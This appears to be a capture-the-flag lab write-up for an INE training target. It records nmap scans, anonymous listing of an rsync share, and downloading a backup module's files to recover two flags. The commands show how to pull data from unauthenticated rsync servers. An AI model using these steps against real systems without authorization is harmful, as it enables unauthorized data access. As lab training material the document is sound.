# Domain info
*Domain*: `target1.ine.local`
*ip*: `192.114.228.3`

# flags
1) FLAG1_a1f0a17811fa4e86bdec6663f8c92114
2) FLAG2_10da4bfadf9b4be4a4356fbe0a301450
# Enumeration
## Port Scan
```shell
- sudo nmap --min-rate 1000 -p- target1.ine.local 

	PORT    STATE SERVICE
	873/tcp open  rsync
	MAC Address: 02:42:C0:72:E4:03 (Unknown)

```

## Service Scan

```shell
- sudo nmap -sS -sV -A -T4 -oX scan.xml target1.ine.local
	
	PORT    STATE SERVICE VERSION
	873/tcp open  rsync   (protocol version 31)
	MAC Address: 02:42:C0:72:E4:03 (Unknown)
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running: Linux 4.X|5.X
	OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
	OS details: Linux 4.15 - 5.8
	Network Distance: 1 hop

```




## rsync Enum
```shell
# got flag1
-rsync rsync://192.114.228.3
	backupwscohen   FLAG1_a1f0a17811fa4e86bdec6663f8c92114

# got flag2
- rsync rsync://192.114.228.3/backupwscohen/* /root/backupwscohen

- ls -la
	total 24
	drwxr-xr-x 2 root root 4096 May 13 13:00 .
	drwx------ 1 root root 4096 May 13 13:00 ..
	-rw-r--r-- 1 root root   25 May 13 13:00 office_staff.vhd
	-rw-r--r-- 1 root root   39 May 13 13:00 pii_data.xlsx
	-rw-r--r-- 1 root root   20 May 13 13:00 TPSData.txt

- cat pii_data.xlsx     
	FLAG2_10da4bfadf9b4be4a4356fbe0a301450

```